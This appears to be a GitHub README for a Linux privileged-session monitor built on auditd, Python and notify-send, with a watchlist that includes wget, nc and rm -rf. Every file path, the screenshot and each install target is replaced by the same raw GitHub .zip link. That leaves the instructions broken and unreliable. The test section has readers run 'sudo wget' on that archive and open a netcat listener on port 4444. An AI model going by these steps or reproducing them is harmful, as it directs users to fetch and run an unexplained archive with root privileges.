# 🔐 Linux Privileged Session Monitoring System

## 📌 Overview
This is a real-time monitoring system for Linux that detects suspicious privileged command activity (e.g., `wget`, `nc`, `rm -rf`) and generates desktop alerts. Built using `auditd`, `Python`, and `notify-send`.

## 🚀 Features
- Watches for root-level or sudo activity via `auditd`
- Sends desktop notifications using `notify-send`
- Avoids spam by alerting only once per command type every 5 minutes
- Runs continuously in the background as a `systemd` service
- Easy to install and extend

## 🔧 Technologies Used
- Python 3
- auditd (Linux audit daemon)
- libnotify-bin (notify-send)
- systemd (for persistence)

## 📂 File Structure

https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip # The main Python script

https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip # auditd rule definitions

https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip # systemd unit file

## 📸 Live Preview

> Here's what it looks like in action!

### ✅ Desktop Notification (via notify-send)
![Desktop Alert Screenshot](https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip)



## 🛠️ Installation Steps

### 1. Install dependencies
```bash
sudo apt update
sudo apt install -y auditd libnotify-bin python3
```
2. Add audit rules

```bash
sudo nano https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip
```
4. Copy the Python script

```bash
sudo cp https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip /opt/
sudo chmod +x https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip
```

5. Create the systemd service

```bash
sudo cp https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip /etc/systemd/system/
sudo systemctl daemon-reexec
sudo systemctl daemon-reload
sudo systemctl enable --now https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip
```

🧪 Test It

```bash
sudo wget https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip
sudo nc -lvp 4444
```
You will receive a desktop pop-up if the command is on the watchlist.
